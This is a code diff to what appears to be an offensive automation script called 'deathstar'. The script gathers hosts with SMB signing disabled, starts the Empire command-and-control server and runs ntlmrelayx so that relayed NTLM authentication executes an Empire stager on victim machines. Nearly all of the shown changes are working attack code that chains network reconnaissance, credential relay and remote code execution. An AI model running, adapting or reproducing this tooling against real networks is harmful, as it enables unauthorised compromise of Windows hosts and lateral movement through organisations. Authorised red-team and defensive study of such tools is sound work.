@@ -73,10 +73,8 @@ def main():
     tmux_window = tmux_session.new_window(attach=True, window_name="deathstar")
     
     if not disable_relay:
-        print("Getting relay target list using CrackMapExec...")
-        print("This can take a few minutes on a full subnet - we need to find a more efficient way to do this part...")
-        subprocess.Popen("touch targets.txt", shell=True).wait()
-        subprocess.Popen("cme --timeout 15 smb %s --gen-relay-list targets.txt" % (target_ip), shell=True).wait()
+        print("Getting relay target list")
+        subprocess.Popen("/opt/check-smb-signing.sh --nmap --out-dir /tmp -a %s" % (target_ip), shell=True).wait()
     
     print("\nLaunching Empire (waiting 10s)...")
     command = 'cd /opt/Empire && ./empire --rest --username %s --password %s' % (empire_user, empire_pass)
@@ -112,7 +110,11 @@ def main():
     print("Stager: " + empire_stager)
     
     if not disable_relay:
-        command = "ntlmrelayx.py -smb2support -tf targets.txt -c '" + empire_stager + "'"
+        if os.path.exists("/tmp/hosts-signing-disabled"):
+            command = "ntlmrelayx.py -smb2support -tf %s -c '%s'" % ("/tmp/hosts-signing-disabled.txt", empire_stager)
+        else:
+            command = "ntlmrelayx.py -smb2support -c '%s'" % (empire_stager)
+        
         #tmux_window.split_window(shell=command)
         tmux_pane = tmux_window.split_window()
         tmux_pane.send_keys(command)
